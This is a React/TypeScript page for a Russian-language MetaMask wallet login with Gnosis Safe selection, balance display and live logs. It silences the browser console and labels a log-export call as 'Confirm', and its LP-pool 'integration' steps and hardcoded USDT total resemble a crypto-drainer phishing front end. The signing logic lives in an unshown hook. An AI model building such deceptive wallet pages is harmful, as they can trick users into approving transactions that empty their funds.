import { useMetamaskLoginLogic } from "./hooks/use-metamask-login";


import metamaskIcon from "./assets/metamask.svg";
const ENABLE_VERBOSE_LOGS = false;
if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {

  (console as any).log = () => { };
  (console as any).info = () => { };
  (console as any).debug = () => { };
  (console as any).warn = () => { };

}

export default function MetamaskLoginPage() {
  const {
    connected,
    address,
    chainId,
    balance,
    logs,
    logsRef,
    toasts,
    safeModalVisible,
    safeCandidates,
    handleSelectSafe,
    handleDismissSafe,
    selectedSafe,
    safeBalance,
    isContractConnected,
    connectMetaMask,
    disconnect,
    exportLogs,
  } = useMetamaskLoginLogic();

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-6">
      <div className="w-full max-w-5xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-8 shadow-2xl relative">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-extrabold text-white">Вход</h1>
            <p className="mt-1 text-sm text-gray-300">Подключитесь через MetaMask для продолжения</p>
          </div>
          <div className="">
            <button
              onClick={connectMetaMask}
              className="w-full flex items-center gap-3 justify-center px-6 py-3 bg-white/90 rounded-lg font-semibold text-gray-800 hover:scale-[1.02] transition-transform"
            >
              <span className="w-8 h-8 inline-block">
                <img src={metamaskIcon} alt="MetaMask" className="w-7 h-7" />
              </span>
              <span>MetaMask</span>
            </button>
          </div>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-stretch">
          {/* Левая часть */}
          <div className="flex flex-col gap-5 h-full">
            <div className="flex flex-col justify-between gap-5 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-xs text-gray-300">Статус</div>
                  <div className="text-lg text-white font-medium">
                    {connected ? "Подключен" : "Не подключен"}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs text-gray-300">Chain</div>
                  <div className="text-sm text-white">{chainId ?? "—"}</div>
                </div>
              </div>
              <div className="mt-4 space-y-2">
                <div className="flex items-center gap-2 mb-2">
                  <div className="text-xs text-gray-300">Адрес</div>
                  {/* Dropdown for wallet selection if Safe available */}
                  {(safeBalance || selectedSafe) && (
                    <select
                      className="ml-2 px-2 py-1 rounded bg-gray-800 text-xs text-gray-200 border border-gray-700 focus:outline-none focus:ring-2 focus:ring-yellow-400"
                      value={selectedSafe ? 'safe' : 'eoa'}
                      onChange={e => {
                        if (e.target.value === 'safe') {
                          if (safeBalance && selectedSafe) return; // already selected
                        } else {
                          if (selectedSafe) handleDismissSafe();
                        }
                      }}
                    >
                      <option value="eoa">EOA</option>
                      {selectedSafe && <option value="safe">Safe</option>}
                    </select>
                  )}
                </div>
                <div className="text-sm text-white break-all">
                  {selectedSafe ? selectedSafe : address ?? "—"}
                </div>
                <div className="text-xs text-gray-300 mt-2">Баланс (ETH)</div>
                <div className="text-sm text-white">
                  {selectedSafe ? safeBalance ?? "—" : balance ?? "—"}
                </div>
                <div className="mt-4 flex gap-2">
                  <button
                    type="button"
                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                    onClick={disconnect}
                  >
                    Отключить
                  </button>
                  <button
                    type="button"
                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                    onClick={exportLogs}
                  >
                    Подтвердить
                  </button>
                </div>
                <div className="mt-3 text-xs text-gray-400">
                  Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
                </div>
              </div>
            </div>
          </div>
          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
            <div className="flex-1">
              <div className="text-sm text-gray-200 mb-3 font-semibold tracking-wide">
                Краткие действия для интеграции
              </div>
              <ol className="text-xs text-gray-400 list-decimal list-inside space-y-1 leading-relaxed">
                <li>Подтвердите кошелёк</li>
                <li>Выберите LP-токены и пул</li>
                <li>Подтвердите выбор и комиссию</li>
                <li>Ожидайте начисление</li>
              </ol>
            </div>
            <div>
              {/* <div className="text-sm text-gray-200 mb-2 font-semibold tracking-wide">
                Доступно к выводу
              </div> */}
              <div className="bg-black/20 border border-white/10 rounded-md p-3 h-28 overflow-y-auto">
                <br />
                <div className="text-xs text-center text-gray-400 py-2">No data</div>
              </div>
            </div>
            <div className="flex justify-between items-center">
              <div className="text-xs text-gray-400">Всего:</div>
              <div className="text-lg text-white font-medium">0.00 USDT</div>
            </div>
          </div>
        </div>
        <div className="flex flex-col gap-4 mt-4 w-full">
          <div className="p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
            <div className="flex items-center justify-between mb-3">
              <div className="text-sm text-gray-300 font-semibold">Live Logs</div>
            </div>
            <div
              ref={logsRef}
              className="h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-xs text-white font-mono border border-white/10 shadow-md whitespace-nowrap overflow-clip"
              style={{
                lineHeight: "1.2",
                maxHeight: "20rem",
              }}
            >
              {logs.length === 0 ? (
                <div className="text-gray-500 text-center mt-8">
                  Логи появятся после действий
                </div>
              ) : (
                logs.map((l, i) => (
                  <div
                    key={i}
                    className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors"
                  >
                    <span className="text-gray-400">[{l.ts}]</span>{" "}
                    <span className={`px-1 rounded text-[10px] bg-gray-700`}>
                      {l.level.toUpperCase()}
                    </span>{" "}
                    <span className="text-white">
                      {l.tag ? `[${l.tag}]` : ""} {l.message}
                    </span>
                    {l.meta && (
                      <pre className="text-[10px] text-gray-400 mt-1">
                        {JSON.stringify(l.meta, null, 2)}
                      </pre>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
        <div className="mt-8 text-xs text-gray-400 underline">
          Политика конфиденциальности <br /> Служба поддержки
        </div>
        {safeModalVisible && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm transition-all duration-300">
            <div className="absolute inset-0" onClick={handleDismissSafe} />
            <div className="relative bg-gradient-to-br from-gray-900 via-gray-800 to-gray-900 border border-gray-700 rounded-2xl shadow-2xl p-8 max-w-md w-full z-60 animate-fadeIn">
              <div className="flex items-center gap-3 mb-4">
                <svg width="32" height="32" fill="none" viewBox="0 0 24 24" className="text-yellow-400"><path d="M12 2L2 7v7c0 5 4 8 10 8s10-3 10-8V7l-10-5z" stroke="currentColor" strokeWidth="2" strokeLinejoin="round"/></svg>
                <span className="text-xl font-bold text-white">Обнаружен Gnosis Safe</span>
              </div>
              <div className="text-sm text-gray-300 mb-6">Выберите Safe для управления или используйте обычный кошелёк (EOA).</div>
              <div className="flex flex-col gap-3 mb-6">
                {safeCandidates.map((s: string) => (
                  <button
                    key={s}
                    type="button"
                    onClick={() => handleSelectSafe(s)}
                    className="text-left px-5 py-3 bg-yellow-400/10 hover:bg-yellow-400/20 border border-yellow-400/30 rounded-lg text-base text-yellow-200 font-semibold transition-colors shadow-sm"
                  >
                    <span className="font-mono text-yellow-100">{s}</span>
                  </button>
                ))}
              </div>
              <div className="flex justify-end gap-2 mt-2">
                <button
                  type="button"
                  onClick={handleDismissSafe}
                  className="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-sm text-white font-semibold border border-gray-600 shadow transition-colors"
                >
                  Использовать EOA
                </button>
              </div>
            </div>
          </div>
        )}
        <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xl px-4">
          {toasts.map((t) => (
            <div
              key={t.id}
              className={
                `w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-sm text-gray-100 shadow-md transform transition-all duration-300 ease-out pointer-events-auto ` +
                (t.entered && !t.leaving
                  ? "opacity-100 translate-y-0 scale-100"
                  : t.leaving
                    ? "opacity-0 -translate-y-3 scale-95"
                    : "opacity-0 -translate-y-3 scale-95")
              }
            >
              <div className="flex items-start gap-3">
                <div className="flex-1">
                  {t.title && <div className="font-semibold mb-0.5 text-gray-50">{t.title}</div>}
                  {t.description && <div className="text-xs text-gray-200">{t.description}</div>}
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}